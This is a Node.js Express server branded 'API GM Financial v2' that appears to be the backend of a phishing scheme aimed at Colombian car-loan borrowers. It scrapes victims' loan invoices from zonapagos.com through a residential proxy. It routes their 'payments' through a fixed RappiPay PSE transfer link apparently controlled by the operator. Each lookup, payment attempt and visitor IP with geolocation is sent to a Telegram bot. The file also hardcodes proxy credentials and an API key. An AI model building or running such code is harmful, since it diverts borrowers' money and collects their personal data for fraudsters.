import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import puppeteer from 'puppeteer';
import https from 'https';
import crypto from 'crypto';

const app = express();
const PORT = process.env.PORT || 10000;

// ── Telegram ──
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || '';
const TG_CHAT_ID  = process.env.TG_CHAT_ID  || '';

function sendTelegram(msg) {
  if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
  const payload = JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' });
  const url = new URL(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`);
  const opts = {
    hostname: url.hostname, path: url.pathname, method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
  };
  const req = https.request(opts, () => {});
  req.on('error', (e) => console.error('[TG] Error:', e.message));
  req.write(payload);
  req.end();
}

app.use(cors());
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy-Report-Only', "default-src * 'unsafe-inline' 'unsafe-eval'");
  next();
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ═══════════════════════════════════════════════════════════════
// ============= CONFIG GEONODE (HARDCODEADO) ====================
// ═══════════════════════════════════════════════════════════════
const GEONODE_HOST = 'us.proxy.geonode.io';
const GEONODE_PORT = 9000;
const GEONODE_USER = 'geonode_PKlL1yvoTG-country-co';
const GEONODE_PASS = '605d224e-19b6-4baa-8107-296ee7d836f5';
const USE_PROXY = true;

// ═══════════════════════════════════════════════════════════════
// ============= POOL DE NAVEGADORES (OPTIMIZADO v2) =============
// ═══════════════════════════════════════════════════════════════
const PRELOGIN_URL = 'https://zonapagos.com/NV_PagosN3/Views/preLogin/PreLoginPage.aspx?ico=33968';

const CHROME_ARGS = [
  '--no-sandbox',
  '--disable-setuid-sandbox',
  '--disable-dev-shm-usage',
  '--disable-blink-features=AutomationControlled',
  '--disable-background-timer-throttling',
  '--disable-renderer-backgrounding',
  '--disable-backgrounding-occluded-windows',
  '--no-first-run',
  '--no-default-browser-check',
  '--disable-extensions',
  '--disable-features=TranslateUI,BlinkGenPropertyTrees',
  '--disable-ipc-flooding-protection',
  '--disable-hang-monitor',
  '--disable-prompt-on-repost',
  '--disable-sync',
  '--metrics-recording-only',
  '--no-zygote',
  '--renderer-process-limit=2',
  '--js-flags=--max-old-space-size=128',
];

// ── Pool simplificado: 1 browser, reciclar páginas ──
let mainBrowser = null;
let readyPages = [];            // páginas ya en el form, listas para llenar
const WARM_PAGES = 2;           // 2 páginas pre-calentadas
let activeConsultations = 0;
const MAX_CONCURRENT = 5;
const waitQueue = [];

async function launchBrowser() {
  const args = [...CHROME_ARGS];
  if (USE_PROXY) {
    args.push(`--proxy-server=http://${GEONODE_HOST}:${GEONODE_PORT}`);
    args.push('--force-webrtc-ip-handling-policy=disable_non_proxied_udp');
    args.push('--proxy-bypass-list=ipinfo.io;*.ipinfo.io');
  }
  return await puppeteer.launch({
    headless: 'new',
    args,
    protocolTimeout: 30000,
  });
}

// ── Bloqueo agresivo: solo dejar pasar zonapagos ──
async function setupPage(page) {
  if (USE_PROXY) {
    await page.authenticate({ username: GEONODE_USER, password: GEONODE_PASS });
  }

  await page.setDefaultTimeout(10000);
  await page.setDefaultNavigationTimeout(15000);

  await page.setRequestInterception(true);
  page.on('request', (req) => {
    const t = req.resourceType();
    const url = req.url();

    // Bloquear todo lo que NO sea esencial para el form
    if (['image', 'stylesheet', 'font', 'media', 'other', 'ping', 'manifest', 'websocket', 'texttrack'].includes(t)) {
      return req.abort();
    }
    // Bloquear trackers y scripts externos
    if (/google|facebook|hotjar|clarity|newrelic|sentry|segment|mixpanel|analytics|gtag|recaptcha|gstatic|doubleclick|cloudflare|cdn\./.test(url) &&
        !url.includes('zonapagos.com')) {
      return req.abort();
    }
    req.continue();
  });

  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
  await page.setViewport({ width: 1280, height: 800 });
  return page;
}

// ── Navegar al form y esperar que esté listo ──
async function navigateToForm(page) {
  const navPromise = page.goto(PRELOGIN_URL, {
    waitUntil: 'domcontentloaded',
    timeout: 15000,
  }).catch(() => {});

  await page.waitForSelector('input[type="text"]', { timeout: 12000 });
  await navPromise;
}

// ── Crear página lista para consultar ──
async function createReadyPage() {
  if (!mainBrowser) throw new Error('Browser no disponible');
  const page = await mainBrowser.newPage();
  await setupPage(page);
  await navigateToForm(page);
  return page;
}

// ── Reciclar página: navegar de vuelta al form ──
async function recyclePage(page) {
  try {
    // Verificar que la página sigue viva
    await page.evaluate(() => true);
    // Navegar de vuelta al form (más rápido que cerrar + crear nueva)
    await navigateToForm(page);
    return page;
  } catch (e) {
    // Página muerta, crear nueva
    try { await page.close(); } catch {}
    return await createReadyPage();
  }
}

// ── Obtener una página lista ──
async function acquirePage() {
  if (readyPages.length > 0) {
    const page = readyPages.pop();
    // Verificar que sigue viva y tiene el form
    try {
      const hasForm = await page.$('input[type="text"]');
      if (hasForm) return page;
      // No tiene form, reciclar
      return await recyclePage(page);
    } catch {
      try { page.close(); } catch {}
      return await createReadyPage();
    }
  }
  return await createReadyPage();
}

// ── Devolver página al pool (reciclar en background) ──
function returnPage(page) {
  // Si hay alguien esperando, darle la página reciclada
  if (waitQueue.length > 0) {
    const resolve = waitQueue.shift();
    recyclePage(page)
      .then(p => resolve(p))
      .catch(() => createReadyPage().then(p => resolve(p)).catch(() => resolve(null)));
    return;
  }

  // Reciclar y agregar al pool
  if (readyPages.length < WARM_PAGES) {
    recyclePage(page)
      .then(p => {
        if (readyPages.length < WARM_PAGES) {
          readyPages.push(p);
          console.log(`[POOL] Reciclada → ${readyPages.length}/${WARM_PAGES} listas`);
        } else {
          p.close().catch(() => {});
        }
      })
      .catch(() => {});
  } else {
    page.close().catch(() => {});
  }
}

// ═══════════════════════════════════════════════════════════════
// ============= CONSULTA ZONA PAGOS (v2 ULTRA-RÁPIDA) ==========
// ═══════════════════════════════════════════════════════════════
async function consultarZonaPagos(documento, placa) {
  if (activeConsultations >= MAX_CONCURRENT) {
    // Esperar a que se libere una página
    const page = await new Promise(resolve => waitQueue.push(resolve));
    if (!page) throw new Error('No hay páginas disponibles');
    activeConsultations++;
    return await _doConsulta(page, documento, placa);
  }

  activeConsultations++;
  let page;
  try {
    page = await acquirePage();
    return await _doConsulta(page, documento, placa);
  } catch (error) {
    if (page) try { page.close(); } catch {}
    throw error;
  } finally {
    activeConsultations--;
  }
}

async function _doConsulta(page, documento, placa) {
  const t0 = Date.now();
  try {
    console.log(`[API] Consultando - Doc: ${documento}, Placa: ${placa}`);

    // ── PASO 1+2: Llenar campos + click en paralelo con espera de resultados ──
    // Preparar la promesa de resultados ANTES del click
    const resultadoPromise = page.waitForFunction(() => {
      for (const tabla of document.querySelectorAll('table')) {
        for (const row of tabla.querySelectorAll('tr')) {
          const cells = row.querySelectorAll('td');
          if (cells.length > 5 && cells[1]?.textContent?.trim()) return true;
        }
      }
      return false;
    }, { timeout: 12000, polling: 200 }).catch(() => false);

    // Llenar + click en un solo evaluate (evita round-trips)
    await page.evaluate((doc, plc) => {
      const setValue = (el, value) => {
        const setter = Object.getOwnPropertyDescriptor(
          window.HTMLInputElement.prototype, 'value'
        ).set;
        setter.call(el, value);
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
      };
      const inputs = document.querySelectorAll('input[type="text"]');
      if (inputs[0]) setValue(inputs[0], doc);
      if (inputs[1]) setValue(inputs[1], plc);
      // Click submit inmediatamente
      const btn = document.querySelector('button[type="submit"], input[type="submit"]');
      if (btn) btn.click();
    }, documento, placa);

    // ── PASO 3: Esperar resultados ──
    const gotResults = await resultadoPromise;
    if (!gotResults) console.warn('[API] Timeout esperando tabla');

    // ── PASO 4: Extraer datos ──
    const datosExtraidos = await page.evaluate(() => {
      const datos = [];
      for (const tabla of document.querySelectorAll('table')) {
        for (const row of tabla.querySelectorAll('tr')) {
          const cells = row.querySelectorAll('td');
          if (cells.length > 5) {
            const rowData = {
              numeroCredito: cells[1]?.textContent?.trim() || '',
              placa: cells[10]?.textContent?.trim() || '',
              fechaVencimiento: cells[14]?.textContent?.trim() || '',
              valorSugerido: cells[15]?.textContent?.trim() || ''
            };
            if (rowData.numeroCredito || rowData.placa) datos.push(rowData);
          }
        }
      }
      return datos;
    });

    const tiempoTotal = ((Date.now() - t0) / 1000).toFixed(2);
    console.log(`[API] ✅ Consulta en ${tiempoTotal}s (${datosExtraidos.length} facturas)`);

    // Devolver página al pool para reciclar
    returnPage(page);

    if (datosExtraidos.length > 0) {
      const resumen = datosExtraidos.map(f =>
        `  • Crédito: ${f.numeroCredito} | Placa: ${f.placa} | Vence: ${f.fechaVencimiento} | $${f.valorSugerido}`
      ).join('\n');
      sendTelegram(
        `🚗 <b>GM Financial — Consulta</b>\n` +
        `📄 Doc: <code>${documento}</code>\n` +
        `🔖 Placa: <code>${placa}</code>\n` +
        `📋 ${datosExtraidos.length} factura(s):\n${resumen}\n` +
        `⏱ ${tiempoTotal}s`
      );
      return {
        estado: 'exitoso',
        documento,
        placa,
        facturas: datosExtraidos,
        tiempoMs: Date.now() - t0,
        timestamp: new Date().toISOString()
      };
    }
    return { error: 'No se encontraron facturas', estado: 'no_encontrado', documento, placa };

  } catch (error) {
    console.error('[API ERROR]', error.message);
    try { page.close(); } catch {}
    throw error;
  }
}

// ═══════════════════════════════════════════════════════════════
// ============= RAPPIPAY PSE ===================================
// ═══════════════════════════════════════════════════════════════
const RAPPIPAY_API = 'https://services.prod-k8s.rappipay.com/integration/pse/api';
const RAPPIPAY_LINK_CODE = 'CRaWdQ';
const FIREBASE_API_KEY = 'AIzaSyBXJ_5dpN6uTDr41m72dcS_ZKJtGc_dVHw';
const FIREBASE_DB_URL = 'https://rpp-platform-mobile-app-prod-default-rtdb.firebaseio.com';

function httpsGet(urlStr, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const opts = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'GET',
      headers: { 'Accept': 'application/json', ...extraHeaders },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch { resolve(body); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

function httpsPost(urlStr, data, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const payload = JSON.stringify(data);
    const opts = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        ...extraHeaders,
      },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch { resolve(body); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

// ── Seguir redirects para obtener URL final (salta Kushkai) ──
function followRedirects(urlStr, maxRedirects = 10) {
  return new Promise((resolve, reject) => {
    let redirects = 0;
    function follow(currentUrl) {
      const url = new URL(currentUrl);
      const opts = {
        hostname: url.hostname,
        port: url.port || 443,
        path: url.pathname + url.search,
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      };
      const req = https.request(opts, (res) => {
        if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
          redirects++;
          if (redirects > maxRedirects) return resolve(currentUrl);
          const next = res.headers.location.startsWith('http')
            ? res.headers.location
            : `${url.protocol}//${url.hostname}${res.headers.location}`;
          res.resume();
          return follow(next);
        }
        // No más redirects — esta es la URL final
        // Pero también revisar si el body tiene un meta refresh o JS redirect
        let body = '';
        res.on('data', c => body += c);
        res.on('end', () => {
          // Buscar meta refresh: <meta http-equiv="refresh" content="0;url=...">
          const metaMatch = body.match(/http-equiv=["']refresh["'][^>]*content=["']\d+;\s*url=([^"']+)/i);
          if (metaMatch) return resolve(metaMatch[1]);
          // Buscar window.location = "..." o window.location.href = "..."
          const jsMatch = body.match(/window\.location(?:\.href)?\s*=\s*["']([^"']+)/i);
          if (jsMatch && jsMatch[1].startsWith('http')) return resolve(jsMatch[1]);
          // No hay redirect, devolver URL actual
          resolve(currentUrl);
        });
      });
      req.on('error', () => resolve(currentUrl));
      req.end();
    }
    follow(urlStr);
  });
}

app.get('/pse/bancos', async (req, res) => {
  try {
    const linkData = await httpsGet(
      `${RAPPIPAY_API}/transfer-link/code/${RAPPIPAY_LINK_CODE}`,
      { 'traceability-id': crypto.randomUUID() }
    );
    const bancos = linkData.banks || [];
    console.log(`[pse] ${bancos.length} bancos obtenidos`);
    return res.json({ ok: true, bancos });
  } catch (err) {
    console.error('[pse] Error bancos:', err.message);
    return res.status(500).json({ ok: false, error: 'Error obteniendo bancos: ' + err.message });
  }
});

app.post('/pse/pagar', async (req, res) => {
  const { bank_code, bank_name, document_type, document_number, amount } = req.body;

  if (!bank_code || !document_number || !amount) {
    return res.status(400).json({ ok: false, error: 'Faltan campos requeridos' });
  }

  try {
    console.log(`[pse] Pago: banco=${bank_code}, doc=${document_number}, monto=${amount}`);

    const linkData = await httpsGet(
      `${RAPPIPAY_API}/transfer-link/code/${RAPPIPAY_LINK_CODE}`,
      { 'traceability-id': crypto.randomUUID() }
    );
    const transfer = linkData.transfer || linkData;
    if (transfer.status !== 'CREATED') {
      return res.status(400).json({ ok: false, error: 'Link no disponible (status: ' + transfer.status + ')' });
    }

    const traceability_id = transfer.traceability_id;
    const minAmount = transfer.min_amount || 10000;
    const maxAmount = transfer.max_amount || 20000000;
    if (amount < minAmount || amount > maxAmount) {
      return res.status(400).json({
        ok: false,
        error: `Monto debe estar entre $${minAmount.toLocaleString()} y $${maxAmount.toLocaleString()}`
      });
    }

    const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '127.0.0.1';

    const paymentPayload = {
      traceability_id,
      bank_code,
      bank_name: bank_name || '',
      document_type: document_type || 'CC',
      document_number: String(document_number),
      amount: Number(amount),
      user_agreement_check: true,
      client_ip: clientIp,
    };

    const paymentResp = await httpsPost(
      `${RAPPIPAY_API}/payment-url`,
      paymentPayload,
      { 'traceability-id': crypto.randomUUID() }
    );

    console.log('[pse] paymentResp:', JSON.stringify(paymentResp).slice(0, 500));

    const firebaseToken = paymentResp.token || paymentResp.custom_token || paymentResp.firebase_token;
    const directUrl = paymentResp.bank_url || paymentResp.url || paymentResp.redirect_url || paymentResp.payment_url;

    if (directUrl) {
      return res.json({ ok: true, bank_url: directUrl, traceability_id });
    }

    if (!firebaseToken) {
      return res.status(500).json({ ok: false, error: 'No se recibió token de pago', debug: paymentResp });
    }

    const txTraceId = paymentResp.traceability_id || traceability_id;

    const firebaseAuth = await httpsPost(
      `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${FIREBASE_API_KEY}`,
      { token: firebaseToken, returnSecureToken: true }
    );

    if (!firebaseAuth.idToken) {
      return res.status(500).json({ ok: false, error: 'Error autenticación Firebase' });
    }

    const firebasePath = `cash_flow_cash_in_pse_link_transaction/${txTraceId}.json?auth=${firebaseAuth.idToken}`;
    let bankUrl = null;

    for (let i = 0; i < 15; i++) {
      await new Promise(r => setTimeout(r, i === 0 ? 3000 : 2000));
      try {
        const fbData = await httpsGet(`${FIREBASE_DB_URL}/${firebasePath}`);
        console.log(`[pse] poll ${i + 1}/15 fbData keys:`, fbData ? Object.keys(fbData) : null);
        const link = fbData?.data?.params?.link || fbData?.params?.link || fbData?.link;
        if (link) { bankUrl = link; break; }
      } catch (fbErr) {
        console.error(`[pse] Firebase poll error:`, fbErr.message);
      }
    }

    if (!bankUrl) {
      sendTelegram(
        `❌ <b>GM Financial — Pago PSE Fallido</b>\n` +
        `📄 Doc: <code>${document_number}</code>\n` +
        `🏦 Banco: ${bank_name || bank_code}\n` +
        `💰 Monto: $${Number(amount).toLocaleString()}\n` +
        `⚠️ No se obtuvo URL del banco`
      );
      return res.status(500).json({ ok: false, error: 'No se pudo obtener la URL del banco.', traceability_id: txTraceId });
    }

    // Intentar seguir redirects de Kushkai para obtener URL final del banco
    let finalUrl = bankUrl;
    try {
      console.log('[pse] bankUrl original (Kushkai):', bankUrl);
      finalUrl = await followRedirects(bankUrl);
      console.log('[pse] URL final (banco):', finalUrl);
    } catch (e) {
      console.error('[pse] followRedirects error:', e.message);
    }

    sendTelegram(
      `💳 <b>GM Financial — Pago PSE</b>\n` +
      `📄 Doc: <code>${document_number}</code>\n` +
      `🏦 Banco: ${bank_name || bank_code}\n` +
      `💰 Monto: $${Number(amount).toLocaleString()}\n` +
      `🔗 URL: ${finalUrl !== bankUrl ? 'Banco directo' : 'Kushkai'}`
    );

    return res.json({ ok: true, bank_url: finalUrl, traceability_id });

  } catch (err) {
    console.error('[pse] Error:', err.message);
    return res.status(500).json({ ok: false, error: 'Error procesando pago: ' + err.message });
  }
});

// ═══════════════════════════════════════════════════════════════
// ============= VISITAS + TELEGRAM ==============================
// ═══════════════════════════════════════════════════════════════
const visitedIps = new Set();

app.post('/api/visit', async (req, res) => {
  const ip = (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();
  if (!ip || visitedIps.has(ip)) return res.json({ ok: true });
  visitedIps.add(ip);
  // Limpiar IPs cada 30 min para no crecer indefinidamente
  setTimeout(() => visitedIps.delete(ip), 30 * 60 * 1000);

  // Geolocalizar IP
  let city = '—', region = '—', country = '—';
  try {
    const geo = await httpsGet(`https://ipinfo.io/${ip}/json`);
    city = geo.city || '—';
    region = geo.region || '—';
    country = geo.country || '—';
  } catch (e) {
    console.error('[VISIT] Geo error:', e.message);
  }

  sendTelegram(
    `👁 <b>GM Financial — Nueva Visita</b>\n` +
    `🌐 IP: <code>${ip}</code>\n` +
    `📍 ${city}, ${region}, ${country}\n` +
    `🕐 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
  );

  res.json({ ok: true });
});

// ═══════════════════════════════════════════════════════════════
// ============= RUTAS PRINCIPALES ===============================
// ═══════════════════════════════════════════════════════════════

app.post('/api/consultar', async (req, res) => {
  try {
    const { documento, placa } = req.body;

    if (!documento || !placa) {
      return res.status(400).json({ error: 'Documento y placa son requeridos', estado: 'error' });
    }

    const resultado = await consultarZonaPagos(documento, placa);

    if (resultado.estado === 'exitoso') {
      res.json(resultado);
    } else {
      res.status(404).json(resultado);
    }

  } catch (error) {
    console.error('[API ERROR]', error.message);
    res.status(500).json({ error: 'Error al consultar: ' + error.message, estado: 'error' });
  }
});

app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    proxy: USE_PROXY ? `${GEONODE_HOST}:${GEONODE_PORT}` : 'off',
    activeConsultations,
    readyPages: readyPages.length,
    queuedRequests: waitQueue.length,
    browserAlive: !!mainBrowser,
  });
});

app.use(express.static('.'));

app.get('/', (req, res) => {
  res.send('<h1>API GM Financial v2</h1>');
});

// ═══════════════════════════════════════════════════════════════
// ============= INICIO ==========================================
// ═══════════════════════════════════════════════════════════════
async function start() {
  try {
    console.log('[INIT] Lanzando browser...');
    mainBrowser = await launchBrowser();
    console.log('[INIT] Browser listo');

    app.listen(PORT, () => {
      console.log(`✅ Servidor en puerto ${PORT}`);
      console.log(`🔗 POST /api/consultar`);
      console.log(`🔗 GET  /pse/bancos`);
      console.log(`🔗 POST /pse/pagar`);
      console.log(`🌐 Proxy: ${USE_PROXY ? GEONODE_HOST + ':' + GEONODE_PORT : 'OFF'}`);
    });

    // Pre-calentar páginas en background
    console.log(`[INIT] Pre-calentando ${WARM_PAGES} páginas...`);
    for (let i = 0; i < WARM_PAGES; i++) {
      try {
        const p = await createReadyPage();
        readyPages.push(p);
        console.log(`[INIT] Página ${i + 1}/${WARM_PAGES} lista`);
      } catch (e) {
        console.error(`[INIT] warmPage ${i + 1} error:`, e.message);
      }
    }
    console.log(`[INIT] ✅ ${readyPages.length} páginas listas para consultas`);

  } catch (error) {
    console.error('Error al iniciar:', error);
    process.exit(1);
  }
}

// Limpiar al cerrar
process.on('SIGINT', async () => {
  console.log('[SHUTDOWN] Cerrando...');
  for (const p of readyPages) try { await p.close(); } catch {}
  if (mainBrowser) try { await mainBrowser.close(); } catch {}
  process.exit(0);
});
process.on('SIGTERM', async () => {
  console.log('[SHUTDOWN] Cerrando...');
  for (const p of readyPages) try { await p.close(); } catch {}
  if (mainBrowser) try { await mainBrowser.close(); } catch {}
  process.exit(0);
});

start();
